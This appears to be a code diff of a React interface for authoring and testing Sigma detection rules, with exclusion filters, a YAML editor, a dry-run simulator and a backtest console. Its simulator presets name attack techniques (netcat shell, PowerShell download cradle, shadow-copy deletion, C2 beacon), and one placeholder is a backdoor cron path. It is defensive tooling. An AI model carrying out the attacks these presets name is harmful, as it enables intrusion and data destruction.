-                  </div>
-                  <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
-                    <span className="text-[10px] text-text-faint uppercase">Est. False Positive Risk</span>
-                    <p className={`text-sm font-bold mt-0.5 uppercase ${
-                      backtestResult.estimated_fp_risk === "low"
-                        ? "text-emerald-400"
-                        : backtestResult.estimated_fp_risk === "medium"
-                          ? "text-amber-400"
-                          : "text-rose-500"
-                    }`}>
-                      {backtestResult.estimated_fp_risk}
-                    </p>
-                  </div>
-                </div>
-
-                {/* Historical Matched Events Table */}
-                <div className="space-y-1.5">
-                  <span className="text-[10px] uppercase font-bold text-text-faint">
-                    Matched Historical Telemetry Events ({backtestResult.sample_matches.length})
-                  </span>
-                  {backtestResult.sample_matches.length === 0 ? (
-                    <div className="rounded-lg border border-border-subtle bg-bg-base/50 p-4 text-center text-text-muted text-[11px]">
-                      Zero events triggered within the scanned window — low false positive risk.
+                {/* False Positive Exclusions */}
+                <div className="space-y-2 rounded-lg border border-border-subtle/70 bg-bg-surface/30 p-3">
+                  <div className="flex items-center justify-between">
+                    <div>
+                      <span className="font-bold text-xs text-text-muted">False-Positive Exclusion Filters (Optional)</span>
+                      <p className="text-[10px] text-text-faint">Events matching these values will be silently excluded to prevent alert fatigue</p>
                     </div>
-                  ) : (
-                    <div className="max-h-56 overflow-y-auto space-y-1 rounded-lg border border-border-subtle bg-bg-base/70 p-2 pr-1">
-                      {backtestResult.sample_matches.map((m: any, idx: number) => (
-                        <div key={idx} className="rounded border border-border-subtle/60 bg-bg-surface p-2 text-[11px]">
-                          <div className="flex items-center justify-between text-text-muted">
-                            <span className="font-bold text-accent">{m.process_name || m.event_type}</span>
-                            <span className="text-[10px] text-text-faint">{m.timestamp?.slice(0, 19).replace("T", " ")}</span>
-                          </div>
-                          <p className="mt-0.5 truncate text-text-primary text-[10px]" title={m.command_line || m.match_reason}>
-                            {m.match_reason || m.command_line}
-                          </p>
+                    <button
+                      type="button"
+                      onClick={() => setBuilderExclusions([...builderExclusions, { field: "CommandLine", modifier: "contains", value: "" }])}
+                      className="press rounded border border-border-subtle bg-bg-surface px-2 py-0.5 text-[10px] text-text-muted hover:text-text-primary hover:border-accent/40"
+                    >
+                      + Add Exclusion
+                    </button>
+                  </div>
+
+                  {builderExclusions.length > 0 && (
+                    <div className="space-y-1.5 mt-2">
+                      {builderExclusions.map((c, i) => (
+                        <div key={i} className="flex items-center gap-2">
+                          <select
+                            value={c.field}
+                            onChange={(e) => {
+                              const next = [...builderExclusions];
+                              next[i].field = e.target.value;
+                              setBuilderExclusions(next);
+                            }}
+                            className="w-36 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                          >
+                            <option value="CommandLine">CommandLine</option>
+                            <option value="Image">Process Name</option>
+                            <option value="ParentImage">Parent Process</option>
+                            <option value="User">User Account</option>
+                            <option value="DestinationIp">Destination IP</option>
+                          </select>
+
+                          <select
+                            value={c.modifier}
+                            onChange={(e) => {
+                              const next = [...builderExclusions];
+                              next[i].modifier = e.target.value;
+                              setBuilderExclusions(next);
+                            }}
+                            className="w-28 rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                          >
+                            <option value="contains">contains</option>
+                            <option value="equals">equals</option>
+                            <option value="startswith">startswith</option>
+                            <option value="endswith">endswith</option>
+                          </select>
+
+                          <input
+                            type="text"
+                            value={c.value}
+                            onChange={(e) => {
+                              const next = [...builderExclusions];
+                              next[i].value = e.target.value;
+                              setBuilderExclusions(next);
+                            }}
+                            placeholder="e.g. benign_updater.exe, health_check"
+                            className="flex-1 rounded border border-border-subtle bg-bg-surface px-2.5 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                          />
+
+                          <button
+                            type="button"
+                            onClick={() => setBuilderExclusions(builderExclusions.filter((_, idx) => idx !== i))}
+                            className="text-text-muted hover:text-risk-malicious p-1"
+                            title="Remove exclusion"
+                          >
+                            ✕
+                          </button>
                         </div>
                       ))}
                     </div>
                   )}
                 </div>
+
+                {/* Builder Actions */}
+                <div className="flex flex-wrap items-center justify-between gap-2 pt-1 border-t border-border-subtle/50">
+                  <button
+                    type="button"
+                    onClick={() => {
+                      syncBuilderToYaml();
+                      setAuthorMode("yaml");
+                    }}
+                    className="press inline-flex items-center gap-1 rounded-md border border-border-subtle bg-bg-surface px-2.5 py-1.5 text-[11px] text-text-muted hover:text-text-primary hover:border-accent/50"
+                  >
+                    <Icon name="terminal" size={11} />
+                    <span>View Generated Sigma YAML →</span>
+                  </button>
+
+                  <div className="flex items-center gap-2">
+                    <button
+                      type="button"
+                      onClick={handleTranspile}
+                      disabled={busy}
+                      className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/10 px-3 py-1.5 font-semibold text-accent hover:bg-accent/20 disabled:opacity-50"
+                    >
+                      <Icon name="terminal" size={12} />
+                      <span>{busy ? "Validating…" : "Transpile & Validate"}</span>
+                    </button>
+                    <button
+                      type="button"
+                      onClick={handleDeploy}
+                      disabled={importMutation.isPending}
+                      className="press inline-flex items-center gap-1 rounded-md border border-signal/60 bg-signal/15 px-3 py-1.5 font-bold text-signal hover:bg-signal/25 disabled:opacity-50"
+                    >
+                      <Icon name="check" size={12} />
+                      <span>{importMutation.isPending ? "Deploying…" : imported ? "✓ Deployed" : "Deploy into Engine"}</span>
+                    </button>
+                  </div>
+                </div>
+              </div>
+            ) : (
+              /* Mode 2: Monospace Sigma YAML Code Editor */
+              <div className="p-3 bg-bg-base">
+                <textarea
+                  rows={12}
+                  spellCheck={false}
+                  value={yaml}
+                  onChange={(e) => setYaml(e.target.value)}
+                  placeholder="Author Sigma YAML detection rule (selection criteria, modifiers, MITRE tags)..."
+                  className="w-full rounded-lg border border-border-subtle/80 bg-bg-surface p-3 font-mono text-xs text-text-primary placeholder:text-text-faint focus:border-accent/70 focus:outline-none leading-relaxed resize-y"
+                />
+
+                {/* Code Action Ribbon */}
+                <div className="mt-2.5 flex flex-wrap items-center justify-between gap-2">
+                  <div className="flex flex-wrap items-center gap-2">
+                    <button
+                      onClick={handleTranspile}
+                      disabled={busy || !yaml.trim()}
+                      className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/10 px-3 py-1.5 font-semibold text-accent hover:bg-accent/20 disabled:opacity-50"
+                    >
+                      <Icon name="terminal" size={12} />
+                      <span>{busy ? "Validating…" : "Transpile & Validate"}</span>
+                    </button>
+
+                    <button
+                      onClick={handleDeploy}
+                      disabled={importMutation.isPending || !yaml.trim()}
+                      className="press inline-flex items-center gap-1 rounded-md border border-signal/60 bg-signal/15 px-3 py-1.5 font-bold text-signal hover:bg-signal/25 disabled:opacity-50"
+                    >
+                      <Icon name="check" size={12} />
+                      <span>{importMutation.isPending ? "Deploying…" : imported ? "✓ Deployed" : "Deploy into Engine"}</span>
+                    </button>
+                  </div>
+
+                  {result && (
+                    <span className="text-risk-clean font-semibold text-[11px]">
+                      ✓ Transpiled {result.transpiled_filter_count} criteria
+                    </span>
+                  )}
+                </div>
+
+                {error && <p className="mt-2 text-risk-malicious text-[11px] font-semibold">{error}</p>}
+              </div>
+            )}
+
+            {/* Transpiled AST Feedback Strip (Visible in both modes if evaluated) */}
+            {result && (
+              <div className="border-t border-border-subtle bg-bg-surface p-3 space-y-2">
+                <div className="flex flex-wrap items-center justify-between gap-2 text-[11px]">
+                  <span className="font-bold text-text-primary">{result.title}</span>
+                  <div className="flex items-center gap-1 text-[10px]">
+                    <span className="rounded bg-accent/15 px-1.5 py-0.2 text-accent">{result.rule_id}</span>
+                    <span className="rounded bg-risk-malicious/15 px-1.5 py-0.2 text-risk-malicious font-bold uppercase">{result.severity}</span>
+                  </div>
+                </div>
+                <div className="flex flex-wrap gap-1">
+                  {result.mitre_tactics.map((t: string) => (
+                    <span key={t} className="rounded bg-bg-base border border-border-subtle px-1.5 py-0.2 text-[10px] text-text-muted">
+                      {t}
+                    </span>
+                  ))}
+                  {result.mitre_techniques.map((t: string) => (
+                    <span key={t} className="rounded bg-accent/10 px-1.5 py-0.2 text-[10px] text-accent">
+                      {t}
+                    </span>
+                  ))}
+                </div>
+                <div className="mt-1 space-y-1 text-[10px]">
+                  {result.criteria.map((c: any, i: number) => (
+                    <div key={i} className="flex items-center gap-1.5 rounded bg-bg-base/70 px-2 py-0.5">
+                      <span className={c.is_exclusion ? "text-risk-suspicious" : "text-accent"}>
+                        {c.is_exclusion ? "[EXCLUSION] " : ""}{c.target_field}
+                      </span>
+                      <span className="text-text-faint">{c.modifier}</span>
+                      <span className="text-risk-clean">&quot;{c.value}&quot;</span>
+                    </div>
+                  ))}
+                </div>
+              </div>
+            )}
+          </div>
+
+          {/* Validation & Testing Lab: Interactive Dry-Run Simulator & Historical Backtester */}
+          <div className="rounded-xl border border-border-subtle bg-bg-surface p-4 space-y-3 shadow-xs">
+            {/* Console Tab Switcher */}
+            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-subtle/60 pb-2.5">
+              <div className="flex items-center gap-1.5">
+                <button
+                  type="button"
+                  onClick={() => setValidationTab("simulator")}
+                  className={`press rounded-md px-3 py-1.5 text-xs font-bold transition flex items-center gap-1.5 ${
+                    validationTab === "simulator"
+                      ? "border border-accent/60 bg-accent/20 text-accent shadow-xs"
+                      : "text-text-muted hover:text-text-primary hover:bg-bg-base"
+                  }`}
+                >
+                  <Icon name="activity" size={12} />
+                  <span>⚡ Live Telemetry Simulator (Dry Run)</span>
+                </button>
+                <button
+                  type="button"
+                  onClick={() => setValidationTab("backtest")}
+                  className={`press rounded-md px-3 py-1.5 text-xs font-bold transition flex items-center gap-1.5 ${
+                    validationTab === "backtest"
+                      ? "border border-accent/60 bg-accent/20 text-accent shadow-xs"
+                      : "text-text-muted hover:text-text-primary hover:bg-bg-base"
+                  }`}
+                >
+                  <Icon name="sliders" size={12} />
+                  <span>📜 Historical Event Store Backtest</span>
+                </button>
+              </div>
+
+              {validationTab === "simulator" && (
+                <div className="flex items-center gap-1 text-[10px]">
+                  <span className="text-text-faint mr-1 uppercase">Sample Presets:</span>
+                  <button
+                    onClick={() => loadSimPreset("netcat")}
+                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
+                  >
+                    Netcat Shell
+                  </button>
+                  <button
+                    onClick={() => loadSimPreset("powershell")}
+                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
+                  >
+                    PowerShell Cradle
+                  </button>
+                  <button
+                    onClick={() => loadSimPreset("shadows")}
+                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
+                  >
+                    Shadow Delete
+                  </button>
+                  <button
+                    onClick={() => loadSimPreset("c2")}
+                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
+                  >
+                    C2 Beacon
+                  </button>
+                  <button
+                    onClick={() => loadSimPreset("benign")}
+                    className="press rounded border border-border-subtle bg-bg-base px-1.5 py-0.5 text-text-muted hover:text-accent hover:border-accent/40"
+                  >
+                    Benign Admin
+                  </button>
+                </div>
+              )}
+
+              {validationTab === "backtest" && (
+                <div className="flex items-center gap-2">
+                  <span className="text-text-faint text-[10px]">Window:</span>
+                  <select
+                    value={backtestWindow}
+                    onChange={(e) => setBacktestWindow(Number(e.target.value))}
+                    disabled={backtestRunning}
+                    className="rounded border border-border-subtle bg-bg-base px-2 py-1 text-xs text-text-primary outline-none focus:border-accent"
+                  >
+                    <option value={500}>500 Events</option>
+                    <option value={1000}>1,000 Events</option>
+                    <option value={2000}>2,000 Events</option>
+                    <option value={5000}>5,000 Events</option>
+                  </select>
+                  <button
+                    onClick={handleRunInlineBacktest}
+                    disabled={backtestRunning || (!yaml.trim() && authorMode === "yaml")}
+                    className="press inline-flex items-center gap-1 rounded-md border border-accent/60 bg-accent/15 px-2.5 py-1 font-semibold text-accent hover:bg-accent/25 disabled:opacity-50"
+                  >
+                    <Icon name={backtestRunning ? "refresh" : "play"} size={11} className={backtestRunning ? "animate-spin" : ""} />
+                    <span>{backtestRunning ? "Scanning…" : "Execute Backtest"}</span>
+                  </button>
+                  {onOpenBacktest && (
+                    <button
+                      type="button"
+                      onClick={() =>
+                        onOpenBacktest({
+                          id: activeRule?.rule_id,
+                          name: builderTitle || activeRule?.title || "Custom Rule",
+                          customYaml: authorMode === "builder" ? syncBuilderToYaml() : yaml,
+                        })
+                      }
+                      className="press rounded border border-border-subtle bg-bg-base px-2 py-1 text-[10px] text-text-muted hover:border-accent hover:text-accent"
+                      title="Open full interactive backtest modal dialog"
+                    >
+                      Modal Backtest ↗
+                    </button>
+                  )}
+                </div>
+              )}
+            </div>
+
+            {/* Tab Body 1: Interactive Live Telemetry Simulator */}
+            {validationTab === "simulator" && (
+              <div className="space-y-3.5">
+                <div className="rounded-lg border border-border-subtle bg-bg-base/70 p-3 space-y-2.5">
+                  <div className="flex items-center justify-between">
+                    <span className="text-[10px] uppercase font-bold text-text-faint">
+                      Simulated Endpoint Event Telemetry
+                    </span>
+                    <span className="text-[10px] text-text-muted">
+                      Test criteria against in-memory payload without modifying historical logs
+                    </span>
+                  </div>
+
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-2.5">
+                    <div>
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Process Name (Image)</label>
+                      <input
+                        type="text"
+                        value={simEvent.process_name}
+                        onChange={(e) => setSimEvent({ ...simEvent, process_name: e.target.value })}
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                    <div className="md:col-span-2">
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Command Line Arguments</label>
+                      <input
+                        type="text"
+                        value={simEvent.command_line}
+                        onChange={(e) => setSimEvent({ ...simEvent, command_line: e.target.value })}
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                  </div>
+
+                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5">
+                    <div>
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Destination IP</label>
+                      <input
+                        type="text"
+                        value={simEvent.dest_ip}
+                        onChange={(e) => setSimEvent({ ...simEvent, dest_ip: e.target.value })}
+                        placeholder="e.g. 198.51.100.25"
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                    <div>
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">Destination Port</label>
+                      <input
+                        type="text"
+                        value={simEvent.dest_port}
+                        onChange={(e) => setSimEvent({ ...simEvent, dest_port: e.target.value })}
+                        placeholder="e.g. 4444"
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                    <div>
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">File Path</label>
+                      <input
+                        type="text"
+                        value={simEvent.file_path}
+                        onChange={(e) => setSimEvent({ ...simEvent, file_path: e.target.value })}
+                        placeholder="e.g. /etc/cron.d/backdoor"
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                    <div>
+                      <label className="text-[9px] text-text-faint uppercase font-bold block mb-0.5">User Context</label>
+                      <input
+                        type="text"
+                        value={simEvent.user}
+                        onChange={(e) => setSimEvent({ ...simEvent, user: e.target.value })}
+                        placeholder="e.g. root"
+                        className="w-full rounded border border-border-subtle bg-bg-surface px-2 py-1 text-xs text-text-primary outline-none focus:border-accent font-mono"
+                      />
+                    </div>
+                  </div>
+
+                  {/* Simulator Action Buttons */}
+                  <div className="flex flex-wrap items-center justify-between gap-2 pt-2 border-t border-border-subtle/50">
+                    <span className="text-[10px] text-text-muted">
+                      Validate logic offline or trigger a live event directly into the SOC findings pipeline.
+                    </span>
+
+                    <div className="flex items-center gap-2">
+                      <button
+                        type="button"
+                        onClick={handleRunSimulation}
+                        disabled={simRunning}
+                        className="press inline-flex items-center gap-1 rounded-md border border-accent/70 bg-accent/20 px-3 py-1.5 font-bold text-accent hover:bg-accent/30 disabled:opacity-50"
+                      >
+                        <Icon name={simRunning ? "refresh" : "play"} size={11} className={simRunning ? "animate-spin" : ""} />
+                        <span>{simRunning ? "Simulating…" : "Run Simulator (Dry Run)"}</span>
+                      </button>
+
+                      <button
+                        type="button"
+                        onClick={handleFireLiveTest}
+                        disabled={triggerRunning}
+                        className="press inline-flex items-center gap-1 rounded-md border border-signal/70 bg-signal/20 px-3 py-1.5 font-bold text-signal hover:bg-signal/30 disabled:opacity-50"
+                        title="Inject event into live backend and create a real alert in the Findings queue"
+                      >
+                        <Icon name={triggerRunning ? "refresh" : "zap"} size={11} className={triggerRunning ? "animate-spin" : ""} />
+                        <span>{triggerRunning ? "Firing…" : "Fire Live Test Event to Fleet"}</span>
+                      </button>
+                    </div>
+                  </div>
+                </div>
+
+                {simError && (
+                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2.5 text-risk-malicious text-[11px]">
+                    {simError}
+                  </p>
+                )}
+
+                {triggerError && (
+                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2.5 text-risk-malicious text-[11px]">
+                    {triggerError}
+                  </p>
+                )}
+
+                {/* Live Trigger Success Card */}
+                {triggerResult && (
+                  <div className="rounded-lg border border-signal/50 bg-signal/15 p-3 flex flex-wrap items-center justify-between gap-2 animate-fade-in">
+                    <div>
+                      <span className="font-bold text-signal text-xs">✓ Live Test Event Ingested!</span>
+                      <p className="text-[11px] text-text-primary mt-0.5">
+                        Generated finding for run <span className="font-mono text-accent">{triggerResult.run_id}</span> ({triggerResult.alerts_count} alert fired).
+                      </p>
+                    </div>
+                    <Link
+                      to="/findings"
+                      className="press rounded-md border border-signal/70 bg-signal/20 px-3 py-1 font-bold text-signal hover:bg-signal/30 text-xs inline-flex items-center gap-1"
+                    >
+                      <span>Open Alert Triage →</span>
+                    </Link>
+                  </div>
+                )}
+
+                {/* Simulation Output Card */}
+                {simResult && (
+                  <div className="rounded-lg border border-border-subtle bg-bg-surface p-3.5 space-y-3 animate-fade-in">
+                    <div className="flex flex-wrap items-center justify-between gap-2 border-b border-border-subtle/50 pb-2">
+                      <div className="flex items-center gap-2">
+                        <span className={`rounded-full px-2.5 py-0.5 font-bold uppercase text-[10px] ${
+                          simResult.matched
+                            ? "bg-risk-clean/20 border border-risk-clean/60 text-risk-clean"
+                            : "bg-risk-malicious/20 border border-risk-malicious/60 text-risk-malicious"
+                        }`}>
+                          {simResult.matched ? "✓ MATCH CONFIRMED" : "○ NO MATCH"}
+                        </span>
+                        <span className="font-bold text-text-primary text-xs">
+                          {simResult.matched ? "Event satisfies all detection criteria" : "Event does not satisfy rule conditions"}
+                        </span>
+                      </div>
+
+                      <span className="text-[10px] text-text-muted">
+                        Recommendation: <span className="text-text-primary">{simResult.recommendation}</span>
+                      </span>
+                    </div>
+
+                    {/* Criteria Diagnostics Table */}
+                    <div className="space-y-1">
+                      <span className="text-[10px] uppercase font-bold text-text-faint">
+                        Step-by-Step Criterion Evaluation ({simResult.diagnostics.length})
+                      </span>
+                      <div className="overflow-x-auto rounded border border-border-subtle/60 bg-bg-base/60">
+                        <table className="w-full text-left text-[11px]">
+                          <thead>
+                            <tr className="border-b border-border-subtle/40 text-text-faint text-[10px] uppercase">
+                              <th className="p-2">Scope</th>
+                              <th className="p-2">Target Field</th>
+                              <th className="p-2">Operator</th>
+                              <th className="p-2">Expected Criteria</th>
+                              <th className="p-2">Observed Value</th>
+                              <th className="p-2 text-right">Result</th>
+                            </tr>
+                          </thead>
+                          <tbody className="divide-y divide-border-subtle/30 font-mono">
+                            {simResult.diagnostics.map((d, idx) => (
+                              <tr key={idx} className="hover:bg-bg-surface/50">
+                                <td className="p-2">
+                                  <span className={`rounded px-1.5 py-0.2 text-[9px] uppercase font-bold ${
+                                    d.is_exclusion ? "bg-amber-400/15 text-amber-400" : "bg-sky-400/15 text-sky-400"
+                                  }`}>
+                                    {d.is_exclusion ? "Exclusion" : "Selection"}
+                                  </span>
+                                </td>
+                                <td className="p-2 font-bold text-accent">{d.target_field}</td>
+                                <td className="p-2 text-text-faint">{d.modifier}</td>
+                                <td className="p-2 text-text-primary">
+                                  {d.expected_values.join(", ")}
+                                </td>
+                                <td className="p-2 text-text-muted truncate max-w-xs" title={d.event_value}>
+                                  {d.event_value || "<empty>"}
+                                </td>
+                                <td className="p-2 text-right">
+                                  <span className={`rounded px-1.5 py-0.2 text-[9px] font-bold ${
+                                    d.passed
+                                      ? "bg-risk-clean/20 text-risk-clean"
+                                      : "bg-risk-malicious/20 text-risk-malicious"
+                                  }`}>
+                                    {d.status}
+                                  </span>
+                                </td>
+                              </tr>
+                            ))}
+                          </tbody>
+                        </table>
+                      </div>
+                    </div>
+
+                    {/* Simulated Alert Preview */}
+                    {simResult.simulated_alert && (
+                      <div className="rounded-lg border border-accent/40 bg-accent/10 p-3 space-y-1.5">
+                        <div className="flex items-center justify-between">
+                          <span className="font-bold text-xs text-text-primary">
+                            Simulated SOC Finding Preview: {simResult.simulated_alert.rule_name}
+                          </span>
+                          <span className="rounded bg-risk-malicious/20 px-2 py-0.2 text-[10px] font-bold text-risk-malicious uppercase">
+                            {simResult.simulated_alert.severity}
+                          </span>
+                        </div>
+                        <p className="text-[11px] text-text-muted">
+                          {simResult.simulated_alert.details}
+                        </p>
+                        <div className="flex items-center gap-1.5 pt-1 text-[10px]">
+                          <span className="rounded bg-bg-base border border-border-subtle px-1.5 py-0.2 text-text-muted">
+                            Tactic: {simResult.simulated_alert.mitre_tactic}
+                          </span>
+                          <span className="rounded bg-accent/20 px-1.5 py-0.2 text-accent font-bold">
+                            Technique: {simResult.simulated_alert.mitre_technique}
+                          </span>
+                        </div>
+                      </div>
+                    )}
+                  </div>
+                )}
+              </div>
+            )}
+
+            {/* Tab Body 2: Historical Backtesting Console */}
+            {validationTab === "backtest" && (
+              <div className="space-y-3">
+                {backtestError && (
+                  <p className="rounded border border-risk-malicious/40 bg-risk-malicious/10 p-2 text-risk-malicious text-[11px]">
+                    {backtestError}
+                  </p>
+                )}
+
+                {!backtestResult && !backtestRunning && (
+                  <p className="py-6 text-center text-text-muted text-[11px]">
+                    Run backtest to evaluate this rule against historical SQLite EDR event streams and verify false-positive risk.
+                  </p>
+                )}
+
+                {backtestResult && (
+                  <div className="space-y-3">
+                    {/* Backtest HUD Strip */}
+                    <div className="grid grid-cols-3 gap-2.5">
+                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
+                        <span className="text-[10px] text-text-faint uppercase">Events Evaluated</span>
+                        <p className="text-sm font-bold text-text-primary mt-0.5">{backtestResult.events_scanned.toLocaleString()}</p>
+                      </div>
+                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
+                        <span className="text-[10px] text-text-faint uppercase">Rule Trigger Hits</span>
+                        <p className="text-sm font-bold text-accent mt-0.5">
+                          {backtestResult.matches_count} ({backtestResult.match_rate_pct}%)
+                        </p>
+                      </div>
+                      <div className="rounded-lg border border-border-subtle bg-bg-base/60 p-2.5">
+                        <span className="text-[10px] text-text-faint uppercase">Est. False Positive Risk</span>
+                        <p className={`text-sm font-bold mt-0.5 uppercase ${
+                          backtestResult.estimated_fp_risk === "low"
+                            ? "text-emerald-400"
+                            : backtestResult.estimated_fp_risk === "medium"
+                              ? "text-amber-400"
+                              : "text-rose-500"
+                        }`}>
+                          {backtestResult.estimated_fp_risk}
+                        </p>
+                      </div>
+                    </div>
+
+                    {/* Historical Matched Events Table */}
+                    <div className="space-y-1.5">
+                      <span className="text-[10px] uppercase font-bold text-text-faint">
+                        Matched Historical Telemetry Events ({backtestResult.sample_matches.length})
+                      </span>
+                      {backtestResult.sample_matches.length === 0 ? (
+                        <div className="rounded-lg border border-border-subtle bg-bg-base/50 p-4 text-center text-text-muted text-[11px]">
+                          Zero events triggered within the scanned window — low false positive risk.
+                        </div>
+                      ) : (
+                        <div className="max-h-56 overflow-y-auto space-y-1 rounded-lg border border-border-subtle bg-bg-base/70 p-2 pr-1">
+                          {backtestResult.sample_matches.map((m: any, idx: number) => (
+                            <div key={idx} className="rounded border border-border-subtle/60 bg-bg-surface p-2 text-[11px]">
+                              <div className="flex items-center justify-between text-text-muted">
+                                <span className="font-bold text-accent">{m.process_name || m.event_type}</span>
+                                <span className="text-[10px] text-text-faint">{m.timestamp?.slice(0, 19).replace("T", " ")}</span>
+                              </div>
+                              <p className="mt-0.5 truncate text-text-primary text-[10px]" title={m.command_line || m.match_reason}>
+                                {m.match_reason || m.command_line}
+                              </p>
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  </div>
+                )}
               </div>
             )}
           </div>
